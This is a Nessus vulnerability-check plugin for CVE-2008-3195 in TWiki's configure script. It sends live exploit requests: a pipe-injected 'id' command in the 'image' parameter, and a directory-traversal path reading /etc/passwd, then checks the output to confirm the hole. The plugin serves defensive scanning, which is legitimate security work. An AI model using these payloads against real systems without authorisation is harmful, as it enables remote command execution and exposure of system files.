#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(34031);
  script_version("$Revision: 1.8 $");

  script_cve_id("CVE-2008-3195");
  script_xref(name:"milw0rm", value:"6269");
  script_xref(name:"milw0rm", value:"6509");
  script_xref(name:"OSVDB", value:"48221");

  script_name(english:"TWiki bin/configure image Parameter Traversal Arbitrary File Access/Execution");
  script_summary(english:"Tries to execute a command or read a local file");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server includes a CGI script that is affected by
multiple vulnerabilities." );
 script_set_attribute(attribute:"description", value:
"The version of TWiki installed on the remote host allows access to the
'configure' script and fails to sanitize the 'image' parameter of that
script.  When the 'action' parameter is set to 'image', an
unauthenticated attacker can leverage this issue to execute arbitrary
code or to view arbitrary files on the remote host subject to the
privileges of the web server user id. 

Note that the TWiki Installation Guide says the 'configure' script
should never be left open to the public." );
 script_set_attribute(attribute:"see_also", value:"http://twiki.org/cgi-bin/view/TWiki/TWikiInstallationGuide" );
 script_set_attribute(attribute:"solution", value:
"Configure the web server to limit access to 'configure', either based
on IP address or a specific user, according to the TWiki Installation
Guide referenced above." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2009 Tenable Network Security, Inc.");

  script_dependencies("twiki_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");


port = get_http_port(default:80);

cmd = "id";
cmd_pat = "uid=[0-9]+.*gid=[0-9]+.*";
file = "../../../../../../../../../../../../../etc/passwd";
file_pat = "root:.*:0:[01]:";


# Test an install.
install = get_kb_item(string("www/", port, "/twiki"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  # First try to execute a command.
  url = string(
    dir, "/configure?",
    "action=image;image=|", urlencode(str:cmd), "|;type=text/plain"
  );

  w = http_send_recv3(method:"GET", item:url, port:port);
  if (isnull(w)) exit(1, "the web server did not answer");
  res = w[2];

  if (egrep(pattern:cmd_pat, string:res))
  {
    if (report_verbosity)
    {
      report = string(
        "\n",
        "Nessus was able to execute the command '", cmd, "' on the remote \n",
        "host using the following URL :\n",
        "\n",
        build_url(port:port, qs:url), "\n"
      );
      if (report_verbosity > 1)
      {
        report = string(
          report,
          "\n",
          "This produced the following output :\n",
          "\n",
          "  ", res
        );
      }
      security_hole(port:port, extra:report);
    }
    else security_hole(port);
    exit(0);
  }

  if (thorough_tests)
  {
    # Try to read a file if command execution didn't work.
    url = string(
      dir, "/configure?",
      "action=image;image=", file, ";type=text/plain"
    );

    w = http_send_recv3(method:"GET", item:url, port:port);
    if (isnull(w)) exit(1, "the web server did not answer");
    res = w[2];

    # There's a problem if looks like the file.
    if (egrep(pattern:file_pat, string:res))
    {
      if (report_verbosity)
      {
        file = str_replace(find:"../", replace:"", string:file);
        file = "/" + file;

        report = string(
          "\n",
          "Nessus was able to retrieve the contents of '", file, "' on the\n",
          "remote host by sending the following request :\n",
          "\n",
          "  ", build_url(port:port, qs:url), "\n"
        );
        if (report_verbosity > 1)
        {
          report = string(
            report,
            "\n",
            "Here are the contents :\n",
            "\n",
            "  ", str_replace(find:'\n', replace:'\n  ', string:res), "\n"
          );
        }
        security_hole(port:port, extra:report);
      }
      else security_hole(port);

      exit(0);
    }
  }
}
